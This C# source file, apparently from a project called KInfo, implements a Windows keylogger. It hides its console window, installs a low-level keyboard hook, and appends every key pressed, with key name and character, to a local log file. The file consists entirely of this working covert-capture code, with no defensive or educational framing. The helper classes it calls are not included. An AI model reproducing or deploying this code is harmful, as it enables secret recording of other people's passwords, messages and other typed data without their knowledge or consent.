using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

using static KInfo.WinAPI;

namespace KInfo
{
  class Logger
  {
    private static IntPtr hookID = IntPtr.Zero;
    private static string filePath;

    const int SW_HIDE = 0;

    public static void Main()
    {
      // filePath = Path.GetTempPath() + "\\info.log";
      filePath = @"c:\razvoj\kinfo.log";
      logToFile(string.Format("--:: {0}  ::--", DateTime.Now));

      // Console.WriteLine(filePath);
      // Console.ReadKey();

      var handle = GetConsoleWindow();
      ShowWindow(handle, SW_HIDE);
      
      hookID = InterceptKeys.SetHook(LowLevelKeyboardProc);
      Application.Run();
      UnhookWindowsHookEx(hookID);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static IntPtr LowLevelKeyboardProc(int nCode, UIntPtr wParam, IntPtr lParam)
    {
      bool down = (wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_KEYDOWN || wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_SYSKEYDOWN);
      bool up = (wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_KEYUP || wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_SYSKEYUP);

      if ((nCode >= 0) && (up || down))
      {
        uint vkCode = (uint)Marshal.ReadInt32(lParam);

        string chars = InterceptKeys.VKCodeToString(vkCode, down);
        if (down)
        {
          string line = string.Format("{0, -12}: {1}", (Keys)vkCode, chars);
          logToFile(line);
        }
      }

      return WinAPI.CallNextHookEx(hookID, nCode, wParam, lParam);
    }

    private static void logToFile(string line)
    {
      StreamWriter sw = new StreamWriter(filePath, true);
      sw.WriteLine(line);
      sw.Close();

      Console.WriteLine(line);
    }
  }
}